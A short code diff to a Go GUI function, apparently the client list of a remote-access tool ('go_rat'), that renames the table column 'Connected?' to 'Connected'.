@@ -43,5 +43,5 @@ func MainWindow() {
 			go_rat.TableColumn("MAC Address"),
 			go_rat.TableColumn("OS"),
 			go_rat.TableColumn("Name"),
-			go_rat.TableColumn("Connected?")).Rows(components.CreateClientTable()...))
+			go_rat.TableColumn("Connected")).Rows(components.CreateClientTable()...))
 }
